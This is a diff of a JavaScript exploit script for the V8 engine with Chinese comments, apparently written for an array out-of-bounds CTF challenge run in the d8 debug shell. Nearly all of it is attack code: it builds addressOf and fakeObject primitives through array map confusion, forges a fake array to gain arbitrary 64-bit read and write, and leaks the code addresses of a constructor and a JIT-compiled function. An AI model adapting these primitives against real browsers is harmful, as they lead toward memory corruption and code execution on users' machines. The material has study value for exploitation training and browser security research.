@@ -25,48 +25,82 @@ var obj_array = [obj];
 var float_array = [1.1];
 var obj_array_map = obj_array.oob();
 var float_array_map = float_array.oob();
-// 泄露某个object的地址
 function addressOf(obj_to_leak)
 {
-	obj_array[0] = obj_to_leak;
-	obj_array.oob(float_array_map);
-	return obj_array[0];
+    obj_array[0] = obj_to_leak;
+    obj_array.oob(float_array_map);
+    let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
+    obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
+    return obj_addr;
 }
-// 将某个addr强制转换为object对象
 function fakeObject(addr_to_fake)
 {
-	float_array[0] = i2f(addr_to_fake + 1n);
-	float_array.oob(obj_array_map);
-	let faked_obj = float_array[0];
-	float_array.oob(float_array_map); // 还原array类型以便后续继续使用
-	return faked_obj;
+    float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
+    float_array.oob(obj_array_map);
+    let faked_obj = float_array[0];
+    float_array.oob(float_array_map); // 还原array类型以便后续继续使用
+    return faked_obj;
+}
+var fake_array = [
+	float_array_map,
+	i2f(0n),
+	i2f(0x41414141n),
+	i2f(0x1000000000n),
+	1.1,
+	2.2
+];
+
+%DebugPrint(fake_array); // fake array map address
+console.log("--------");
+var fake_array_addr = addressOf(fake_array);
+var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
+var fake_object = fakeObject(fake_object_addr);
+
+
+function read64(addr)
+{
+	fake_array[2] = i2f(addr + 0x1n - 0x10n);
+	var leak_info = f2i(fake_object[0]);
+	//console.log("[*] leak addr: 0x" + hex(addr) + " data: 0x" + hex(leak_info));
+	return leak_info;
+}
+
+function write64(addr, data)
+{
+	fake_array[2] = i2f(addr + 0x1n - 0x10n);
+	fake_object[0] = i2f(data);
+	//console.log("[*] write data to addr: 0x" + hex(addr) + " data: 0x" + hex(data));
 }
 
 function t(i)
 {
-	var b = i % 0xc2;
-    var d = i - 0xc2;
-    var e = i ^ 0xc2;
-    buf[0x58] = 0xc3;
-    buf[0x5f] = 0xc3;
-    buf[0x5a] = 0xc3;
-    buf[0x5e] = 0xc3;
-    buf[0xf] = 0x5;
-    var extra = e + 0xc305;
-    // buf[e + 0x5] = 0xc3;
-    buf[0x5] = 0xc3;
-	var test_obj_addr = 0x456;
-	//%DebugPrint(test_obj);
-	if (i == 9999) {
-		test_obj_addr = f2i(addressOf(buf));
-		console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
-		%DebugPrint(buf);
-		%SystemBreak();
-	}
-    var result = b + d + e + extra;
-    return result;
-	//%SystemBreak();
+
+	var test_obj = [1.1, 2.2];
+%DebugPrint(test_obj);
+var test_obj_addr = addressOf(test_obj);
+console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
+%DebugPrint(test_obj.constructor);
+var leak_code_addr = read64(addressOf(test_obj.constructor) + 0x30n);
+console.log("[*] leak code addr : 0x" + hex(leak_code_addr));
+var leak_constructor_addr = read64(leak_code_addr + 0x41n);
+console.log("[*] leak constructor addr : 0x" + hex(leak_constructor_addr));
+console.log("---------------");
+%DebugPrint(t);
+var leak_t_addr = read64(addressOf(t) + 0x30n);
+console.log("[*] leak t addr : 0x" + hex(leak_t_addr));
+var leak_t_code_addr = read64(leak_t_addr + 0x41n);
+console.log("[*] leak t code addr : 0x" + hex(leak_t_code_addr));
+
+	%SystemBreak();
+//	var a = [1.1,2.2,3.3];
+//var address = addressOf(a);
+//var read = read64(address);
+//console.log("[*]read 0x"+hex(address)+":0x"+hex(read));
+//%DebugPrint(a);
+//%SystemBreak();
+//write64(address,0x01020304n);
+//%SystemBreak();
 }
 
-for (var i = 0; i < 10000 ; i++)
+for(var i = 0;i < 100000; i++)
 	t(i);
